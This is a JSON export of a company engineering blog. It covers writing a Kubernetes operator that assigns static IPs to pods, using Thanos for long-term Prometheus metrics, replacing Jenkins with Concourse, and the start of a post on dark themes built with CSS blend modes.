pods are allowed to\\nbe packed together or in which AZ they are going to run. All of those requirements are collected and points given to each\\nnode on how well they meet the requirements. The node that fits best, gets chosen.\\n\\nAll of these are things the scheduler will do for you automatically, however it is also possible to give the cluster a\\n`KubeSchedulerConfiguration` object that will tell the scheduler to also reach out to a service for additional point scoring.\\nThe SchedulerConfiguration is a JSON file and for further explanations, please have a look at this\\nexcellent [blog post](https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/).\\n\\nIn our case, we could have written a service that checks which IP Addresses are assigned to the Nodes and moved the Pods\\nonto those nodes. This would have required us to make sure that those nodes had all needed IP-Addresses all the time.\\nThat sounded not very enticing when doing cluster upgrades as it would have needed to be at least a semi-manual process.\\nSo we decided against this approach.\\n\\n### Creating an operator\\nAn Operator/Controller on the other hand is a component observing resources and then try to create the declared resources.\\nThe difference between a controller and an operator is basically that an operator is handling the lifecycle of an\\napplication, whereas a controller may control specific resources that are not associated with a specific application.\\nThey both use the controller pattern though and both can be implemented with the same toolset, so for simplicity sake in the\\ncontext of this article, we will consider them to be equal.\\n\\nOperators usually consists at least out of a **[CRD(CustomResourceDefinition)][2]**, an **event listener** and a **reconciliation loop**.\\nThe *CRD* basically creates a new type of resource and effectively implements a domain specific language for the operator. The whole description on what this deployment\\nneeds to look like and all its abilities need to be defined in the *CRD*. The operator will create an *event listener* for that\\n*CRD* as the primary resource and additional *event listeners* for the secondary resource (most likely pods in this example).\\nThe *event listener* will let the *reconciliation loop* know once a [CRUD][3] operation has been requested on either the primary or\\nsecondary resource. The *loop* will then try to bring the *CRD* into the desired state, depending on what operation has been\\nrequested. So in the Redis example it will either create the pods, update the pods, in the case of an upgrade it might blue/green\\ndeploy the pods or delete the pods. Basically things a human operator would do in this case, just in programmatic form, taking it\\nfrom a declarative form into existing resources.\\n\\nAs our initial problem was making services available on static IP addresses, we chose to explore this approach further,\\nbasically attaching additional IP addresses to the nodes running specific pods.\\n\\n## Building an Operator/Controller\\nFor building an operator, there are several frameworks out there, but we will only look at the [operator-framework](https://github.com/operator-framework/operator-sdk) in\\nthis article.\\n\\n### Operator-SDK\\nThe Operator framework is a project that is designed to help you get started on creating an operator. To achieve that,\\nit will generate quite a bit of boilerplate.\\n\\nThe Operator-SDK supports three different models of creating an operator:\\n- Helm\\n- Ansible\\n- Golang\\n\\nDepending on your choice of tool, you will be able to integrate deeper into Kubernetes or not.\\n\\n![operator-sdk-capabilites](/img/blog/operator/operator-capability-level.png \\"Operator sdk capabilities (Taken from the operator-sdk repo)\\")\\n*[Operator sdk capabilities][1]*\\n\\nAs we didn\'t want to be limited by our choice later on and wanted to expose metrics from our operator, we chose to\\nimplement our operator in golang. We will be using the operator-sdk version 0.12 for this.\\n\\n### What we want to do\\nLooking at the problem again, we need some way to make sure that a node that runs a specific pod, needs to\\nhave an IP address attached to it. This IP address will be given to connecting parties as a entry point to our\\nsystem and thus cannot change.\\n\\nFeatures it needs to support\\n- Reserve IP address from range\\n- Attach IP address to node running pod\\n- Detach IP address from node that is not running pod\\n- Move IP addresses around in case of node failure\\n\\nThis feature list already shows some things we will not and most likely cannot support. For example autoscaling of\\nreplica sets will not work as an IP address is bound to a node with an assigned pod. There is\\na 1-1 association here. However it is still possible to use the self-healing properties of Deployments\\nin this case.\\n\\nWhen thinking about modelling this behaviour, we basically decided on the following approach:\\n- Create a IP kind (for reserving the IP Address in the Range)\\n- Use annotations to attach the IP Address to a pod\\n\\nWe also thought about creating a StaticIPDeployment kind, but at the end decided against it, as\\nwe feared that the lifecycle management would be way more complicated if we needed to manage a deployment\\ninstead of just controlling the assignment of an IP Address.\\n\\nAfter all this is the first Operator we are going to write and didn\'t want to drown in complexity from day one.\\nWe would rather iterate and scrap everything after we tried it, then going too complex from the start.\\n\\n\\n### Implementation\\n\\nThe first thing you do when starting off a new operator, is that you initialize the directory of your\\noperator with the following command:\\n\\n```\\noperator-sdk new app-operator --repo <YOURREPO>\\n```\\n\\nThis will create some boilerplate folders and files for you and will look roughly like this:\\n\\n![operator-fs-structure](/img/blog/operator/operator-structure.png \\"Operator Folder Structure\\")\\n\\nThe next thing you might want to do is then add the boilerplate for a CRD and a Controller:\\n\\n```\\noperator-sdk add api --api-version=ip.wgtwo.com/v1alpha1 --kind=IP\\noperator-sdk add controller --api-version=ip.wgtwo.com/v1alpha1 --kind=IP\\n```\\n\\nAfter creating the boilerplate, your folder structure will look a lot like this:\\n\\n![operator-fs-structure-expanded](/img/blog/operator/operator-structure-expanded.png \\"Operator Folder Structure Expanded\\")\\n\\nThe most important files right now are in:\\n- cmd/manager/main.go (the main program that will run in the cluster)\\n- pkg/apis/ip/v1alpha1/ip_types.go (definition of the CRD)\\n- pkg/controller/ip_controller.go (event listener and reconciliation loop)\\n\\n#### Creating the CRD\\n\\nTo start off, we define how our CRD should look like to be able to manage our IP Address. We do this,\\nby creating structs in go that have all the fields our CRD shall have. This includes metadata, \\"spec\\" and\\n\\"status\\" fields.\\n\\nThere is also a bit of operator-sdk specific code we need to add. This is so that the sdk can generate the\\nopenapi spec and other auto-generated code.\\n\\n```\\n// +k8s:openapi-gen=true\\n// +kubebuilder:subresource:status\\n// +kubebuilder:resource:path=ips,scope=Cluster\\ntype IP struct {\\n\\tmetav1.TypeMeta   `json:\\",inline\\"`\\n\\tmetav1.ObjectMeta `json:\\"metadata,omitempty\\"`\\n\\n\\tSpec   IPSpec   `json:\\"spec,omitempty\\"`\\n\\tStatus IPStatus `json:\\"status,omitempty\\"`\\n}\\n```\\n\\nThe \\"spec\\" needs to contain all information the controller needs to create the resource.\\nThe \\"status\\" part needs to contain all the bookkeeping information the controller needs to work. In a way the\\n\\"status\\" fields are used as a database for operating Kubernetes (yes, this is oversimplified).\\n\\n```\\n// +k8s:openapi-gen=true\\ntype IPSpec struct {\\n\\tAddress string `json:\\"address\\"`\\n\\tReassign bool `json:\\"reassign,omitempty\\"`\\n}\\n\\n// IPStatus defines the observed state of IP\\n// +k8s:openapi-gen=true\\ntype IPStatus struct {\\n\\tAssigned bool   `json:\\"assigned\\"`\\n\\tClaimed  bool   `json:\\"claimed\\"`\\n\\tNode     string `json:\\"node,omitempty\\"`\\n\\tPod      string `json:\\"pod,omitempty\\"`\\n\\tOriginal IPSpec `json:\\"original,omitempty\\"`\\n}\\n```\\n\\nAs you can see our new IP Resource type, as defined by the CRD that we are gonna create from these structs, is\\ngoing to have two fields: \\"Address\\" and \\"Reassign\\".\\nThe corresponding \\"status\\" part of the resource, has a lot more fields, which we are using for bookkeeping.\\n\\nAfter we have created those structs and know how the CRD needs to look like, we actually auto-generate the CRD yaml:\\n```\\noperator-sdk generate k8s\\noperator-sdk generate openapi\\n```\\nNB: This changed since operator-sdk 0.15\\n\\n#### Creating the controller\\n\\nThere are two main parts to the controller. One part that creates a watcher on resources and one part\\nthat reconciles your resource (in our case the IP and Pods).\\n\\n##### Watching for resource changes\\nThe watch code is in our case in the `add` function of ip_controller.go:\\n```\\n\\t// Watch for changes to primary resource IP, as this always requires an action\\n\\terr = c.Watch(&source.Kind{Type: &ipv1alpha1.IP{}}, &handler.EnqueueRequestForObject{})\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\n\\t// Create Filter list triggering on ip.wgtwo.com/ip as annotation\\n\\tpred := predicate.Funcs{\\n\\t\\t// Ignore the pod if it does not contain annotation ip.wgtwo.com/ip\\n\\t\\tCreateFunc: func(e event.CreateEvent) bool {\\n\\t\\t\\treturn hasAnnotation(e.Meta)\\n\\t\\t},\\n\\t\\tUpdateFunc: func(e event.UpdateEvent) bool {\\n\\t\\t\\tif hasAnnotation(e.MetaOld) || hasAnnotation(e.MetaNew){\\n\\t\\t\\t\\treturn true\\n\\t\\t\\t} else {\\n\\t\\t\\t\\treturn false\\n\\t\\t\\t}\\n\\t\\t},\\n\\t\\tDeleteFunc: func(e event.DeleteEvent) bool {\\n\\t\\t\\t// Evaluates to false if the object has been confirmed deleted.\\n\\t\\t\\treturn !e.DeleteStateUnknown\\n\\t\\t},\\n\\t}\\n\\t// Watch for all pods having the right annotation\\n\\terr = c.Watch(&source.Kind{Type: &corev1.Pod{}}, &handler.EnqueueRequestForObject{}, pred)\\n```\\nHere we are creating watchers for all changes to the `IP` resource and watchers for all create/update/delete operations on\\npods, if they have a specific annotation set.\\n\\nIf any of these conditions are met, the reconciliation loop will be triggered.\\n\\n##### Reconciliation\\n\\nThis is where the business logic of your operator/controller is sitting. The `Reconcile` function in `ip_controller.go` will\\nbe triggered whenever one of the watch conditions fits.\\nWe do not know which type of resource triggered the loop, so that is the first thing we need to figure out:\\n```\\noip := &ipv1alpha1.IP{}\\nerr := r.client.Get(context.TODO(), request.NamespacedName, oip)\\nif err == nil {\\n    ... yes it is a resource of kind IP ... go and do business\\n}\\n...\\nop := &corev1.Pod{}\\nerr = r.client.Get(context.TODO(), request.NamespacedName, op)\\nif err == nil {\\n    ... yes it is a resource of kind Pod ... go and do business\\n}\\n...\\n```\\n\\nIn these two code blocks, we are handling all the interactions for the primary resource of kind IP and the secondary\\nresource of type pod. Depending on what has happened last we have different scenarios.\\n\\nCases for the IP resource to consider:\\n- IP is new\\n- IP has been modified\\n- IP has been deleted\\n\\nCases for the Pod resource to consider:\\n- Annotation sticking the IP to the pod has been deleted\\n- IP needs to be assigned to a pod\\n- Pod has moved to another node\\n- Pod has been deleted\\n\\nWe will not go any further into the detail on what these parts are actually doing, as this is enough\\nto actually give you an idea on how this can be accomplished.\\n\\n\\n## Summary\\n\\nWe have been looking at how to expand Kubernetes to suit our needs better. Creating the Operator/Controller\\nhas taught us quite a bit about how Kubernetes works and has already saved us work in the past\\nfew months, especially on node failures.\\n\\nThe operator-sdk has been a great tool for us to solve this problem and we see that there is a lot of work\\ngoing into it, making it simpler to create operators. It might look intimidating at first, but is worth the effort and\\nwe think in the future Kubernetes operators will be the way how stateful components will be managed.\\n\\n\\n## Resources / Further Reading\\n\\n- Programming Kubernetes by Stefan Schimanski and Michael Hausenblas\\n- [Creating a custom kube-scheduler](https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/)\\n- [Operator SDK](https://github.com/operator-framework/operator-sdk)\\n\\n[1]: https://github.com/operator-framework/operator-sdk/blob/master/README.md\\n[2]: https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\\n[3]: https://en.wikipedia.org/wiki/Create,_read,_update_and_delete"},{"id":"metrics-unlimited-thanos","metadata":{"permalink":"/blog/metrics-unlimited-thanos","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-01-28-Thanos-infinite-metrics.md","source":"@site/../blog/2020-01-28-Thanos-infinite-metrics.md","title":"Towards observability nirvana: infinite metric retention with Thanos","description":"In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and","date":"2020-01-28T00:00:00.000Z","formattedDate":"January 28, 2020","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"observability","permalink":"/blog/tags/observability"},{"label":"prometheus","permalink":"/blog/tags/prometheus"},{"label":"thanos","permalink":"/blog/tags/thanos"},{"label":"kubernetes","permalink":"/blog/tags/kubernetes"}],"readingTime":5.055,"truncated":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/hihrig/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQGc3sG-ltGzlA/profile-displayphoto-shrink_400_400/0/1516250699138?e=1648684800&v=beta&t=qpxr39O2hNY54vsUcCbt1wH8fc2lMf07zW1etQD_gxY","key":"holger-ihrig"}],"frontMatter":{"slug":"metrics-unlimited-thanos","title":"Towards observability nirvana: infinite metric retention with Thanos","date":"2020-01-28T00:00:00.000Z","tags":["infrastructure","observability","prometheus","thanos","kubernetes"],"authors":"holger-ihrig"},"prevItem":{"title":"Extending Kubernetes for our needs","permalink":"/blog/extending-k8s/"},"nextItem":{"title":"We killed the butler: Replacing Jenkins with Concourse","permalink":"/blog/replacing-jenkins-with-concourse"}},"content":"In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and\\nservices. **wgtwo** is no exception here and as we are operating in the TelCo space\\nwe wanted to know more about the usage patterns of our platform over days, months and even years.\\n\\n\x3c!--truncate--\x3e\\n\\nInternally we have been running Prometheus for a long time with a fairly limited retention of 30 days. This did not\\nallow us to look far enough back in time to make the observations we wanted to.\\nLuckily for us there already was a solution out there that would fill our needs and in addition to that make our\\nmonitoring stack more resilient. The solution is called [Thanos](https://thanos.io/).\\n\\n## Thanos\\nThanos was originally developed by a company called [Improbable](https://improbable.io/) to provide long term storage\\nfor Prometheus. It evolved into a much more complicated component which wildly improved the scalability of the\\nPrometheus monitoring Stack.\\n\\nThe basic functionality however is that Thanos will upload the metrics collected by Prometheus onto any service with a\\nS3-compatible API or any other storage target supported by the Prometheus remote write feature. For readability we\\nwill only refer to it as S3 Storage as this is our storage target.\\n\\nWe shall briefly look at all those components before describing how we are leveraging Thanos to obtain a higher metric\\nretention and higher reliability.\\n\\n### Thanos Sidecar\\nThe Sidecar runs as the name suggests in the same pod as Prometheus and observes when Prometheus saves new storage\\nbuckets on disk, which it does about every 2 hours. If configured to do so, it will upload those storage bucket into S3.\\nAnother important feature is that it extends the Prometheus Pod with an API that can be used by Thanos Querier\\nas a Store API endpoint to query Prometheus metrics.\\n\\n### Thanos Store\\nThanos Store implements the Thanos Store API and makes the metric data stored in the S3 bucket available to the\\nThanos Querier. To do that it observes the configured S3 Bucket and reads the metadata of the stored storage buckets\\navailable in S3.\\n\\n### Thanos Querier\\nQuerier implements the Prometheus Query API and understands PromQL. It then sends the query using the aforementioned\\nStore API to all known Thanos Stores (discovered using service discovery) and awaits the metric information from the\\nstores, be it directly from Prometheus via the sidecar or metrics stored in S3 Object storage via Thanos Store.\\n\\n### Thanos Compactor\\nIt does not make a lot of sense to keep old metrics that are scraped every 15 or 30 seconds forever. At some point these\\nmetrics would no longer be useful to make sense of your metrics. This is where\\nthe Thanos Compactor comes in. It creates aggregates of old metrics based on rules. It will for example\\naggregate metrics that are older than 30 days into 5 minute chunks. This saves resources and still gives you\\nalmost the same accuracy when looking at longer timespans. After those metrics have been aggregated, they are\\nwritten back into the S3 bucket and the metadata gets updated.\\n\\n### Thanos Ruler\\nThe Ruler component is the Thanos equivalent of Recording Rules. It can look at all Store APIs and generate new metrics\\naccording to the Recording Rules fed into the Ruler component. However since this rule processing is not done against a\\nlocal datastore, it is possible that these new metric datapoints will not always be generated as it relies on a reliable\\ndata source to do this in the required intervals.\\n\\n## Architecture in a Cluster\\n\\n![Thanos Architecture](/img/blog/thanos/thanos_architecture.png)\\n\\nAs we can see, there are quite a few things going on in this architectural view of the system, but on the other hand it\\nis fairly simple to understand as the components are nicely decoupled from each other.\\n\\nAn interesting thing here is that the drawing has multiple Prometheus instances with multiple sidecars. Thanos actually\\nallows for deduplication of timeseries data. The data uploaded from the sidecars contains information about which prometheus\\ninstance the metrics are generated from, and adds that. The Querier can then deduplicate this data so that the metrics shown\\nin Grafana are consistent and do not come sometimes from Prometheus A and sometimes from Prometheus B.\\n\\nThis design also allows for an interesting other Use Case: querying multiple clusters. As\\nlong as the storage location used by the sidecars for uploading the metrics is identical, the time series data is\\navailable to the Thanos Store and therefor the Querier and Grafana.\\nThat even allows to run Grafana, Querier and Store in a completely different part of the world if need be.\\n\\n## Is it worth it?\\n\\n### Pros\\n- highly available Prometheus\\n- increased reliability (decoupled query component)\\n- infinite metric storage\\n- query multiple clusters from a single point\\n- easy to scale\\n\\n### Cons\\n- more complex architecture\\n- increased resource usage\\n\\n## What are the biggest benefits for us?\\n\\nAs stated in the beginning of this article one of our objectives for implementing Thanos was the increased\\nmetric retention to be able to look back further in time.\\n\\nThe most interesting features for us are to be able to:\\n- analyze trends and identify anomalies within the mobile core network\\n- visualize and graph service usage\\n- predict service usage on peak days (think New Years Eve)\\n- observe behaviour over multiple deployments (regions, customers and cloud providers)\\n\\n## Summary\\n\\nEven though Thanos comes with an increased architectural and operational complexity, we have to say after running it for a while, we think it is totally worth it. We can make architecture decisions by looking further\\nback in time than before. It also has the additional advantage that a misconfiguration of a Prometheus deployment\\ndoes not pull down the whole stack as Prometheus is HA and only updates one at a time. If the deployment fails,\\nwe can get notified and the deployment can be aborted. Also upgrades of the whole monitoring stack, can\\nnow be done gradually, which is also a great advantage for us!"},{"id":"replacing-jenkins-with-concourse","metadata":{"permalink":"/blog/replacing-jenkins-with-concourse","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2019-12-20-jenkins-to-concourse.md","source":"@site/../blog/2019-12-20-jenkins-to-concourse.md","title":"We killed the butler: Replacing Jenkins with Concourse","description":"At wgtwo, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:","date":"2019-12-20T00:00:00.000Z","formattedDate":"December 20, 2019","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"CICD","permalink":"/blog/tags/cicd"},{"label":"devops","permalink":"/blog/tags/devops"}],"readingTime":5.11,"truncated":true,"authors":[{"name":"Anna Kennedy","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/annaken","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQG43m4lVjJm8g/profile-displayphoto-shrink_400_400/0/1517558635100?e=1648684800&v=beta&t=BXA0nV3ZTaID9m1UD7GMS87NhYZRsYPcrPiIg30SYRw","key":"anna-kennedy"}],"frontMatter":{"slug":"replacing-jenkins-with-concourse","title":"We killed the butler: Replacing Jenkins with Concourse","date":"2019-12-20T00:00:00.000Z","tags":["infrastructure","CICD","devops"],"authors":"anna-kennedy"},"prevItem":{"title":"Towards observability nirvana: infinite metric retention with Thanos","permalink":"/blog/metrics-unlimited-thanos"},"nextItem":{"title":"Hacking dark themes with CSS blend modes","permalink":"/blog/hacking-dark-themes-with-css-blend-modes/"}},"content":"At **wgtwo**, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:\\n\\n\x3c!--truncate--\x3e\\n\\n* running unit tests on each pull request\\n* building and running integration tests with bazel on every merge to the monorepo\\n* building container images and upload them to the registry\\n* scanning all images for security flaws\\n* running acceptance tests in the staging environment\\n* syncing secrets between different sources\\n* notifying slack if changes are made in Kubernetes\\n\\nWe had been using [Jenkins](https://jenkins.io/) to run such pipelines, but having to configure it by navigating a web GUI made it difficult to maintain, redeploy, and upgrade, so we decided to look for alternatives.\\n\\n![Jenkins](/img/blog/jenkins-to-concourse/jenkins.png)\\n\\nThe majority of our code lives in a monorepo, and we use Bazel to manage builds and tests.\\nWe try to do all of our infrastructure configuration via [gitops](https://www.gitops.tech/) so it was important that a continuous integration and deployment system not only play nicely with our existing structures, but be itself configurable from code.\\n\\nWe spent time investigating other options, and eventually settled on **[Concourse](https://concourse-ci.org/), a cloud-native CI/CD server where tasks are deployed in containers, and config is stored as yaml**.\\n\\n\\n## Infrastructure as code\\n\\nWe run Concourse in Kubernetes, so the setup and configuration itself is all done with yaml files and kubectl. It\'s fast and easy to upgrade and redeploy.\\n\\nWithin Concourse, the pipeline configuration is entirely yaml-based; there are no buttons in the UI except for an abort/re-run button.\\n\\n```\\njobs:\\n- name: run-acceptance-tests-staging\\n  plan:\\n  - task: run-tests\\n    config:\\n      inputs:\\n      - name: monorepo\\n      run:\\n        path: /bin/bash -c runtests.sh\\n    on_failure:\\n      put: notify-slack-ci\\n```\\n\\n![Concourse task](/img/blog/jenkins-to-concourse/concourse_task.png)\\n\\nPipelines are made up of jobs that run in series or parallel; jobs consist of tasks.\\nPipelines, jobs and tasks are described in code and automatically visualised in the UI.\\nChanges to pipelines are applied by updating the yaml file and running Concourse\'s [fly cli](https://concourse-ci.org/fly.html) tool.\\n\\n\\n## Containerised deployment\\n\\nConcourse runs every job in its own container, which means that every job uses an entirely clean, reproducible environment. Any dependencies required for a task can be pre-installed in the image.\\nThis is a huge improvement for us over Jenkins, where dependencies were installed to the entire worker node, and artifacts from previous builds were left lying about on the server.\\n\\nWe use docker containers, and we also run Concourse itself as a container, which means a bit of docker-in-docker magic.\\nIt look a little work to build an image we were happy with, but beyond that it went surprisingly smoothly for us on the whole.\\nThe only drawback is that we have to run images in privileged mode, but in our self-managed Kubernetes cluster this isn\'t really too much of an issue.\\n\\nThere were some challenges in figuring out what resources needed to be allocated; we settled on three worker nodes and a maximum of 2 active tasks per worker. We see a little bit of slowness some afternoons when the pull-requests are coming thick and fast, but the cluster remains stable. It would be nice to set some autoscaling here to cope with short-term peaks in load.\\n\\n![Concourse pipeline](/img/blog/jenkins-to-concourse/concourse_pipeline.png)\\n\\n\\n## Debugging\\n\\nSince the tasks all run in containers, it\'s easy to debug issues locally by running the same image on the laptop as is running in Concourse.\\nAlternatively, the [fly execute](https://concourse-ci.org/running-tasks.html#fly-execute) cli tool runs a local project in a container in Concourse, a nice interim step when trying to get a deploy working.\\n\\nThe [fly intercept](https://concourse-ci.org/builds.html#fly-intercept) tool offers a way to log into a running container in concourse to troubleshoot:\\n\\n```\\n$ fly intercept -j ecs-services\\n1: build #27, step: monorepo, type: get\\n2: build #27, step: notify-slack-ci, type: get\\n3: build #27, step: notify-slack-ci, type: put\\n4: build #27, step: run-acceptance-tests-staging, type: task\\nchoose a container: 4\\nroot@02f69d15-b7be-4f2e-43f7-24f549071bb1:/tmp/build/3a58ea39#\\n\\n```\\n\\n## Resource types and extending Concourse\\n\\nThere are a large number of [resource types](https://github.com/concourse/concourse/wiki/Resource-Types) available for Concourse, making it fairly straightforwards to configure pipelines.\\n\\nAs resource types in Concourse are all based on containers, extending Concourse means introducing a new container that can be called from Concourse.\\n\\nA resource type needs to implement the following executables/scripts:\\n\\n* check (checking new versions of the resource, eg. is there a new pull request)\\n* in (pulling a new version of the resource down, eg. download code from a pull request)\\n* out (pushing a new version of the resource up, eg. push a build result to Github)\\n\\nThese binaries need to be placed under /opt/resource in the docker container.\\nConcourse calls these binaries with JSON payload and optional parameters that can all be found [here](https://concourse-ci.org/implementing-resource-types.html).\\nWhat is done in those executables/scripts is up to the implementer, but it is really easy to extend concourse using this mechanism.\\n\\n\\n## Learning curve\\n\\nThe move from Jenkins to Concourse has overall been a very positive step for us. If there has been any drawback it\'s that implementing any brand new system usually means something of a learning curve, and Concourse is no exception.\\n\\nThe documentation is sometimes a bit minimal, but now that we have a number of pipelines up and running we\'re finding it easier and easier to add more.\\nSimilarly, it took some time to settle on how to allocate resources such that we cope with load but aren\'t wasteful at quiet times.\\n\\n\\n## Summary\\n\\nThe biggest improvements of Concourse over Jenkins have been:\\n\\n* clean UI, no clicky clicky\\n* every build uses its own container - no shared dependencies or artifacts\\n* configuration of Concourse in code (in Kubernetes) - easy to upgrade and redeploy Concourse\\n* configuration of pipelines in code - good visibility into running tasks\\n* wide range of resource types\\n* ability to extend resources\\n* easy to troubleshoot and debug\\n\\nOverall, we\'re pretty pleased with Concourse. There are a few features we\'re eagerly awaiting in future releases, such as re-running targeted builds, but for the most part it has been relatively straightforwards to import all our existing jobs from Jenkins and add more.\\n\\n\\n## References\\n\\n* <https://github.com/concourse>\\n* <https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey>\\n* <https://github.com/karlkfi/concourse-dcind>\\n* <https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh>\\n* <https://concoursetutorial.com>"},{"id":"hacking-dark-themes-with-css-blend-modes/","metadata":{"permalink":"/blog/hacking-dark-themes-with-css-blend-modes/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2019-06-25-hacking-dark-themes-with-blend-modes.md","source":"@site/../blog/2019-06-25-hacking-dark-themes-with-blend-modes.md","title":"Hacking dark themes with CSS blend modes","description":"Like many other companies, Working Group Two has a number of applications which are","date":"2019-06-25T00:00:00.000Z","formattedDate":"June 25, 2019","tags":[{"label":"CSS","permalink":"/blog/tags/css"},{"label":"frontend","permalink":"/blog/tags/frontend"},{"label":"design","permalink":"/blog/tags/design"}],"readingTime":5.72,"truncated":true,"authors":[{"name":"David \xc5se","title":"Tech Lead @ wgtwo","url":"https://linkedin.com/in/davidaase","imageURL":"https://media-exp1.licdn.com/dms/image/C4D03AQFD4dPSvm-pIg/profile-displayphoto-shrink_400_400/0/1541960720294?e=1648684800&v=beta&t=sj0aTz-Im1u46B5m3O5KMPMD-PydrJoewIoeII5zP1k","key":"david-\xe5se"}],"frontMatter":{"slug":"hacking-dark-themes-with-css-blend-modes/","title":"Hacking dark themes with CSS blend modes","date":"2019-06-25T00:00:00.000Z","tags":["CSS","frontend","design"],"authors":["david-\xe5se"]},"prevItem":{"title":"We killed the butler: Replacing Jenkins with Concourse","permalink":"/blog/replacing-jenkins-with-concourse"}},"content":"Like many other companies, [Working Group Two](/) has a number of applications which are\\nonly available internally or to partners.\\nOur UI designer (that\'s me) prefers light backgrounds with dark text, but one of our\\npartners have wanted a dark theme for one of our applications for some time.\\nWe haven\'t been able to prioritize this, but we were using CSS blend modes for a different project,\\nand wondered if we could use them to quickly put together a dark theme.\\n\\n\x3c!--truncate--\x3e\\n\\nThe application in this post is one of our partner portals, which follows the Material Design\\nguidelines. It\u2019s built with [Vue](https://vuejs.org/) and [Vuetify](https://vuetifyjs.com/en/),\\nbut also has some custom components and JS plugins (for uploads, charts, etc).\\nIt took two hours to create the dark theme and deploy it to production, and we\'ll walk\\nyou through the whole process (with screenshots) in this post.\\n\\n## What are CSS blend modes?\\nMozilla has a [page](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode) which explains\\nthe concept fairly well. In short, blend modes decide what should happen when two colors are\\nput on top of each other. The default blend mode is `normal`, which is what most people are used to.\\nAs an example, the `normal` blend mode paints dark text on top of a light background on the\\npage you\u2019re reading right now.\\n\\nThe application we have is light and we want it to be dark, so we need to look for blend modes that\\ncan help with that. Scrolling through the [list at MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode),\\none mode in particular stands out:\\n\\n```\\ndifference\\n    The final color is the result of subtracting the darker of the two colors from the lighter one.\\n    A black layer has no effect, while a white layer inverts the other layer\'s color.\\n```\\n\\n![Starting point, mostly basic Vuetify](/img/blog/blend-modes/01-console-subs-light.png)\\n![After applying](/img/blog/blend-modes/01-console-subs-difference.png)\\n\\nOkay, that\u2019s actually not too bad. There are some obvious issues, like the color hues being\\ninverted and everything being way too dark, but it should be possible to make some adjustments.\\n\\n## Working with a non-standard blend mode\\nThe most jarring issue is that the colors have been inverted.\\nOur teal logo is now red, and the red \\"unlocked account\\" icon we use in development mode is now teal.\\nThis is in line with the documentation for the `difference` blend mode, but luckily CSS also supports hue-rotation,\\nso we can just rotate the hue back 180 degrees. Our base style now looks like this:\\n\\n```css\\nhtml.dark-mode {\\n   mix-blend-mode: difference;\\n   filter: hue-rotate(180deg);\\n}\\n```\\n\\nHue is measured in degrees from 0 to 360, so we\'re flipping the hues twice.\\nBelow, you can see a color wheel with no effects (1), with blend-mode (2), and with blend mode and hue rotate (3).\\nAll the effects are applied to the same image here in your browser.\\n\\n\x3c!-- ![](/img/blog/blend-modes/color-mode-all.png) --\x3e\\n\\nAs you can see from the illustration, brightness and saturation\\nis not accounted for with hue-rotate, so most colors won\'t look the same.\\nThey will have the same hue though, so semantic meaning (red = danger, green = safe) is preserved.\\\\\\\\\\nWe\'re lucky that our brand color doesn\'t change too much!\\n\\nSo, this fixes our colors, but we also have to do something about the darkness.\\nThe whole application is pretty much pitch black, and to make it brighter we need to \u2026 turn down the brightness:\\n\\n```css\\nhtml.dark-mode {\\n   mix-blend-mode: difference;\\n   filter: hue-rotate(180deg) brightness(0.67);\\n}\\n```\\n\\nLet\'s have a look <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-2 uk-child-width-1-2@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/01-console-subs-light.png\\" caption=\\"Starting point, mostly basic Vuetify\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/01-console-subs-difference-filters.png\\" caption=\\"After applying blend mode and filters\\"%}\\n</div> --\x3e\\n\\nThat\u2019s a lot better (blend modes are fun!). Our dark theme is close to done now,\\nbut we have one problem remaining: shadows. Because of our blend mode, making\\nthings darker means making them brighter, so all our shadows look like white glows.\\nSince our base color is white/light gray, we can\u2019t simply change our shadows to white as there would be no contrast.\\nOur solution was to embrace the \u201cglow\u201d feel and change the shadows to brand colored glows <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-2 uk-child-width-1-2@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/02-console-shadows-light.png\\" caption=\\"Normally, the menu creates a shadow on the background\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/02-console-shadows-glow.png\\" caption=\\"More of a glow than a shadow\\"%}\\n</div> --\x3e\\n\\nAs you might have noticed in the previous screenshot, we also made some other adjustments.\\nWe made the logo white using a brightness filter, and we set the base font-weight to 700 (bold),\\nsince contrast is lower in the dark theme.\\n\\n## More comparison screenshots\\nThe following gallery shows some screenshots with custom components and JavaScript plugins.\\nNo additional CSS was written for any of the views <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-3 uk-child-width-1-6@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-blacklist-light.png\\" caption=\\"A standard Vuetify data table\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-blacklist-dark.png\\" caption=\\"It\'s not perfect in dark mode, but it works\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-batch-light.png\\" caption=\\"Our 